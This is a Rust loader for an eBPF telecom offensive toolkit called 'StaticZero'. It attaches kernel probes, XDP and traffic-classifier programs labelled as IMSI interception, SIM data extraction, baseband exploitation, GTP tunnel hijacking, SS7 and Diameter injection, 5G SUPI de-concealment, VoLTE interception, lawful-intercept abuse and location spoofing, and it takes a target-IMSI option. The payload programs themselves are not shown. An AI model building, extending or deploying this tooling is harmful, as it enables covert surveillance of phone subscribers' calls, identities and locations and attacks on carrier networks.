use std::path::PathBuf;
use std::sync::Arc;
use std::sync::atomic::{AtomicBool, Ordering};

use anyhow::{Context, Result};
use aya::programs::{KProbe, SchedClassifier, Xdp, XdpFlags};
use aya::{Ebpf, EbpfLoader};
use aya::maps::AsyncPerfEventArray;
use aya::util::online_cpus;
use bytes::BytesMut;
use clap::Parser;
use tokio::signal;
use tracing::{error, info, warn};
use tracing_subscriber::EnvFilter;

use common::EventHeader;

#[derive(Parser, Debug)]
#[command(name = "staticzero-offense")]
#[command(about = "StaticZero Telecom Exploitation Research Loader")]
struct Cli {
    /// Path to compiled eBPF object file
    #[arg(short, long, default_value = "target/bpfel-unknown-none/release/staticzero-offense")]
    bpf_path: PathBuf,

    /// Enable telecom interception (F89-F100: AT cmd, baseband, SIM, IMSI, downgrade, GTP, SS7, Diameter, RRC, NAS, SUPI, N2)
    #[arg(long)]
    enable_telecom: bool,

    /// Enable advanced telecom (F101-F108: VoLTE, eSIM, slicing, WiFi calling, LI, femtocell, SUPL, roaming)
    #[arg(long)]
    enable_telecom_advanced: bool,

    /// Enable all features
    #[arg(long)]
    all: bool,

    /// Target IMSI for interception (15-digit string)
    #[arg(long)]
    target_imsi: Option<String>,

    /// GTP tunnel interface for core network interception
    #[arg(long, default_value = "gtp0")]
    gtp_iface: String,

    /// IMS/SIP interface for VoLTE interception
    #[arg(long, default_value = "ims0")]
    ims_iface: String,

    /// WiFi calling interface
    #[arg(long, default_value = "wlan0")]
    wifi_iface: String,
}

#[tokio::main]
async fn main() -> Result<()> {
    tracing_subscriber::fmt()
        .with_env_filter(EnvFilter::from_default_env())
        .init();

    let cli = Cli::parse();
    let running = Arc::new(AtomicBool::new(true));
    let r = running.clone();

    tokio::spawn(async move {
        signal::ctrl_c().await.expect("failed to listen for ctrl+c");
        r.store(false, Ordering::SeqCst);
    });

    info!("StaticZero Telecom Offense Loader starting");
    info!("Loading eBPF programs from {:?}", cli.bpf_path);

    let mut bpf = EbpfLoader::new()
        .load_file(&cli.bpf_path)
        .context("failed to load eBPF object")?;

    let enable_telecom = cli.all || cli.enable_telecom;
    let enable_advanced = cli.all || cli.enable_telecom_advanced;

    // ── Features 89-100: Telecom Interception ────────────────────────────────
    if enable_telecom {
        // Kprobes for modem/baseband/SIM/NAS interception
        let kprobes = [
            ("shadow_at_cmd_inject", "tty_write", "F89: AT Command Injection"),
            ("shadow_baseband_exploit", "usb_submit_urb", "F90: Baseband Exploitation"),
            ("shadow_sim_clone", "vfs_read", "F91: SIM Data Extraction"),
            ("shadow_imsi_intercept", "qmi_wwan_rx_fixup", "F92: IMSI Interception"),
            ("shadow_rrc_redirect", "tty_write", "F93: RRC Connection Redirect"),
            ("shadow_nas_intercept", "qmi_wwan_rx_fixup", "F98: NAS Message Interception"),
            ("shadow_supi_deconceal", "ecies_decrypt", "F99: 5G SUPI De-concealment"),
        ];

        for (name, attach_point, desc) in &kprobes {
            match bpf.program_mut(name) {
                Some(prog) => {
                    let kprobe: &mut KProbe = prog.try_into()?;
                    kprobe.load()?;
                    kprobe.attach(attach_point, 0)?;
                    info!("{} enabled", desc);
                }
                None => warn!("{} ({}) not found in eBPF object, skipping", desc, name),
            }
        }

        // XDP on GTP interface for tunnel hijacking
        if let Some(prog) = bpf.program_mut("shadow_gtp_hijack") {
            let xdp: &mut Xdp = prog.try_into()?;
            xdp.load()?;
            xdp.attach(&cli.gtp_iface, XdpFlags::default())?;
            info!("F94: GTP Tunnel Hijacking enabled on {}", cli.gtp_iface);
        }

        // TC classifiers for SS7/Diameter/NGAP/protocol downgrade
        let tc_progs = [
            ("shadow_protocol_downgrade", "F93: Protocol Downgrade"),
            ("shadow_ss7_inject", "F95: SS7 MAP Injection"),
            ("shadow_diameter_exploit", "F96: Diameter AVP Manipulation"),
            ("shadow_n2_inject", "F100: 5G N2 Interface Injection"),
        ];

        for (name, desc) in &tc_progs {
            if let Some(prog) = bpf.program_mut(name) {
                let tc: &mut SchedClassifier = prog.try_into()?;
                tc.load()?;
                info!("{} loaded (attach to interface manually)", desc);
            }
        }
    }

    // ── Features 101-108: Advanced Telecom ───────────────────────────────────
    if enable_advanced {
        let advanced_kprobes = [
            ("shadow_volte_intercept", "sip_msg_send", "F101: VoLTE/VoNR Interception"),
            ("shadow_esim_exploit", "tty_write", "F102: eSIM Provisioning Attack"),
            ("shadow_femtocell_exploit", "ipsec_output", "F106: Femtocell Exploitation"),
        ];

        for (name, attach_point, desc) in &advanced_kprobes {
            match bpf.program_mut(name) {
                Some(prog) => {
                    let kprobe: &mut KProbe = prog.try_into()?;
                    kprobe.load()?;
                    kprobe.attach(attach_point, 0)?;
                    info!("{} enabled", desc);
                }
                None => warn!("{} ({}) not found, skipping", desc, name),
            }
        }

        // XDP for WiFi calling exploitation
        if let Some(prog) = bpf.program_mut("shadow_wifi_calling_exploit") {
            let xdp: &mut Xdp = prog.try_into()?;
            xdp.load()?;
            xdp.attach(&cli.wifi_iface, XdpFlags::default())?;
            info!("F104: WiFi Calling Exploitation enabled on {}", cli.wifi_iface);
        }

        // TC classifiers for advanced telecom
        let tc_advanced = [
            ("shadow_slice_exploit", "F103: Network Slicing Exploit"),
            ("shadow_li_abuse", "F105: Lawful Intercept Abuse"),
            ("shadow_supl_spoof", "F107: SUPL/Location Spoofing"),
            ("shadow_roaming_pivot", "F108: Roaming/IPX Pivoting"),
        ];

        for (name, desc) in &tc_advanced {
            if let Some(prog) = bpf.program_mut(name) {
                let tc: &mut SchedClassifier = prog.try_into()?;
                tc.load()?;
                info!("{} loaded", desc);
            }
        }
    }

    // ── Event loop ───────────────────────────────────────────────────────────
    let mut perf_array = AsyncPerfEventArray::try_from(
        bpf.take_map("TELECOM_EVENTS").context("TELECOM_EVENTS map not found")?,
    )?;

    let cpus = online_cpus().map_err(|e| anyhow::anyhow!("failed to get online CPUs: {}", e))?;
    for cpu_id in cpus {
        let mut buf = perf_array.open(cpu_id, None)?;
        let running = running.clone();

        tokio::spawn(async move {
            let mut buffers = (0..10)
                .map(|_| BytesMut::with_capacity(256))
                .collect::<Vec<_>>();

            while running.load(Ordering::Relaxed) {
                let events = match buf.read_events(&mut buffers).await {
                    Ok(events) => events,
                    Err(e) => {
                        error!("Error reading perf events: {}", e);
                        continue;
                    }
                };

                for i in 0..events.read {
                    let ptr = buffers[i].as_ptr() as *const EventHeader;
                    let header = unsafe { ptr.read_unaligned() };
                    info!(
                        "EVENT type={} pid={} ts={}",
                        header.event_type, header.pid, header.timestamp_ns
                    );
                }
            }
        });
    }

    info!("StaticZero Offense Engine running. Press Ctrl+C to stop.");
    signal::ctrl_c().await?;
    running.store(false, Ordering::SeqCst);
    info!("Shutting down.");
    Ok(())
}
